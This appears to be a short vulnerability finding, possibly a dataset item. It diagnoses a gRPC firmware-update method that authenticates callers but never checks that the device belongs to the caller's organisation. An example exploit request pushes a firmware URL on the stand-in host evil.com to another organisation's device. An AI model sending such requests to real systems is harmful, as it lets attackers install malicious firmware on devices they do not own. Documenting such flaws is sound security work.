diagnosis: The gRPC method accepts a device_uuid and firmware_url, dispatching an over-the-air update directly to the device. It authenticates the caller but omits checking device.org_id == caller.org_id. An attacker can flash malicious or corrupted firmware binaries to devices owned by other organizations.
exploit_request:
POST /devices.DeviceService/PushFirmwareUpdate HTTP/2.0
Host: grpc.example.com
Content-Type: application/grpc
TE: trailers
authorization: Bearer <attacker_token>

[gRPC payload: device_uuid: "dev-c8f9-42b1", firmware_url: "https://evil.com/firmware.bin"]
